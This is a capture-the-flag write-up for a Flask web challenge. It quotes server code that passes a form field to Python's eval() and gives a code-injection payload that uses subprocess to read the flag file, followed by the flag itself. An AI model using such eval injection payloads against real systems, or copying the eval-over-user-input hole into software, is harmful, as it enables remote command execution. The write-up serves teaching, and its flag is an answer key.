<h1>David Byrne and co. Online Tailors</h1>

<h3>Category: Web Exploitation</h3>

<h3>Author: Emily Baird (Analytical Engine)</h3>

<h2>Description</h2>

<p>Something seems off about these guys' calculations...</p>

<p>The flag is in <code>/flag/flag.txt</code></p>

<h2>Hints</h2>

<p>There is a vulnerability in the way that the server takes user input and processes it.</p>

<h2>Solution</h2>

<p>We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: </p>

<p>```python 
if request.method == 'POST':
    size = request.form['inputShoulder']
    try:
        size = eval(size)
        jacket = (size * 20) + 2
    except:
        jacket = 'There was an error calculating your jacket size.'</p>

<pre><code>return render_template('index.html', size=size, jacket=jacket)
</code></pre>

<p>```</p>

<p>This exploit relies on the dangerous use of Python's <code>eval()</code> function. When passed a string, <code>eval</code> will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings, (ie, sending "1+1" will return <code>2</code>), we can also use it to send lines of code that we want Python to run. By using the <code>subprocess</code> library, we can execute shell commands from within Python. Especially useful is the <code>getoutput()</code> function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at <code>/flag/flag.txt</code>, we can craft the following payload:</p>

<pre><code>`__import__('subprocess').getoutput('cat /flag/flag.txt'))`
</code></pre>

<h2>Flag</h2>

<p>magpie{4int<em>no</em>party<em>4int</em>n0_d1sc0}</p>
